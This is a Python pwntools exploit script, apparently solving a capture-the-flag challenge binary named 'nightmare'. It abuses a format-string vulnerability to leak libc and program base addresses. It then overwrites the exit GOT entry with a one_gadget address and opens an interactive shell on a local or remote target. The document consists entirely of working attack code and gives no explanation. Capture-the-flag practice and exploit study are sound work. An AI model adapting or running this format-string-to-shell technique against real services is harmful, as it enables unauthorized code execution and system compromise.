#!/usr/bin/env python3

from pwn import context, ELF, fmtstr_payload, log, remote, sys

context.binary = elf = ELF('nightmare_patched')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def leak(p, position: int) -> int:
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Enter the escape code>> ', f'%{position}$p'.encode())
    ret = int(p.recvline().decode(), 16)
    p.sendline(b'xx')
    return ret


def main():
    p = get_process()

    __libc_start_main_ret_addr = leak(p, 13)
    log.info(f'Leaked __libc_start_main_ret: {hex(__libc_start_main_ret_addr)}')
    elf.address = leak(p, 20) - 0x1180
    glibc.address = __libc_start_main_ret_addr - 243 - glibc.sym.__libc_start_main

    log.success(f'ELF base address: {hex(elf.address)}')
    log.success(f'Glibc base address: {hex(glibc.address)}')

    one_gadget = (0xe6aee, 0xe6af1, 0xe6af4)[1]

    payload = fmtstr_payload(5, {elf.got.exit: glibc.address + one_gadget})

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'>> ', payload)

    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Enter the escape code>> ', b'lulzk')

    p.recv()
    p.interactive()


if __name__ == '__main__':
    main()
